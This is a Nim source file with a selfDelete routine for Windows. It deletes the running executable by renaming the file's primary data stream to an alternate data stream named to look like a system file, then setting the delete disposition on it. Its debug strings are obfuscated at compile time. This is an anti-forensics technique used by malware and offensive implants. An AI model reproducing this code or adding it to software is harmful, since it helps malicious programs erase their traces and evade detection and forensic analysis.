import strenc
from winim import PathFileExistsW
from winim/lean import HINSTANCE, DWORD, LPVOID, WCHAR, PWCHAR, LPWSTR, HANDLE, NULL, TRUE, WINBOOL, MAX_PATH
from winim/lean import DELETE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, INVALID_HANDLE_VALUE
from winim/lean import CreateFileW, RtlSecureZeroMemory, RtlCopyMemory, SetFileInformationByHandle, GetModuleFileNameW, CloseHandle

type
  FILE_RENAME_INFO = object
    ReplaceIfExists*: WINBOOL
    RootDirectory*: HANDLE
    FileNameLength*: DWORD
    FileName*: array[8, WCHAR]

proc dsOpenHandle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc dsRenameHandle(hHandle: HANDLE): WINBOOL =
    let DS_STREAM_RENAME = newWideCString(obf(":msrpcsv"))

    var fRename : FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream : LPWSTR = cast[LPWSTR](DS_STREAM_RENAME[0].unsafeaddr)
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, 3, addr fRename, sizeof(fRename) + sizeof(lpwStream))  # fileRenameInfo* = 3

proc dsDepositeHandle(hHandle: HANDLE): WINBOOL =
    var fDelete : FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE;

    return SetFileInformationByHandle(hHandle, 4, addr fDelete, sizeof(fDelete).cint)  # fileDispositionInfo* = 4

proc selfDelete*(): void =
    var
        wcPath : array[MAX_PATH + 1, WCHAR]
        hCurrent : HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        when defined verbose:
            echo obf("DEBUG: Failed to get the current module handle")
        quit(QuitFailure)

    hCurrent = dsOpenHandle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined verbose:
            echo obf("DEBUG: Failed to acquire handle to current running process")
        quit(QuitFailure)

    when defined verbose:
        echo obf("DEBUG: Attempting to rename file name")

    if not dsRenameHandle(hCurrent).bool:
        when defined verbose:
            echo obf("DEBUG: Failed to rename to stream")
        quit(QuitFailure)

    when defined verbose:
        echo obf("DEBUG: Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")

    CloseHandle(hCurrent)

    hCurrent = dsOpenHandle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        when defined verbose:
            echo obf("DEBUG: Failed to reopen current module")
        quit(QuitFailure)

    if not dsDepositeHandle(hCurrent).bool:
        when defined verbose:
            echo obf("DEBUG: Failed to set delete deposition")
        quit(QuitFailure)

    when defined verbose:
        echo obf("DEBUG: Closing handle to trigger deletion deposition")

    CloseHandle(hCurrent)

    if not PathFileExistsW(addr wcPath[0]).bool:
        when defined verbose:
            echo obf("DEBUG: File deleted successfully")